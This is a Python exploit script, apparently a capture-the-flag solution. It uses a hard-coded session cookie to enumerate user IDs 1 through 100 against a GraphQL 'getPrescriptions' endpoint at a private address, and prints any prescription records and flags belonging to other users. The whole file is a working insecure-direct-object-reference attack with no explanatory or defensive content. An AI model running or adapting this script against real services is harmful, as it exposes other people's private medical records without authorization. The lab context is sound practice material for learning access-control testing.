import requests
import json

def main():
    url = "http://10.0.162.112:5003/graphql"
    cookie_name = "session"
    cookie_value = ".eJwlzjsOwjAMANC7ZGaInTh2epkq_gnWlk6Iu1OJ_Q3vU_Y84nyW7X1c8Sj7y8tWwmvqWN4xpjeikWzYExcZUJW-xFRV0CYA4wKZ0o1btOqYjDJxTGxTvTcfqWxpEmCwkDVrQm-Q5HYjdHLi5qBAlDktRWGVO3Kdcfw3WL4_5hUv0A.aeEV3Q.rm6l2OphHLjb864XQYYP-D0t7Y8"

    session = requests.Session()
    session.cookies.set(cookie_name, cookie_value)
    session.headers.update({"Content-Type": "application/json"})

    for user_id in range(1, 101):
        query_str = f'query {{ getPrescriptions(userId: {user_id}) {{ id userId prescriptionDetails flag }} }}'
        payload = {"query": query_str}

        try:
            response = session.post(url, json=payload, timeout=10)
            response.raise_for_status()
            data = response.json()

            if "data" in data and data["data"] and data["data"].get("getPrescriptions"):
                prescriptions = data["data"]["getPrescriptions"]
                for pres in prescriptions:
                    if pres.get("flag"):
                        print(f"[+] Found Flag for userId {user_id}: {pres['flag']}")
                        print(f"    Full Prescription Details: {pres}")
            elif "errors" in data:
                pass
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed for userId {user_id}: {e}")
        except json.JSONDecodeError:
            print(f"[-] JSON decode failed for userId {user_id}. Response: {response.text}")

if __name__ == "__main__":
    main()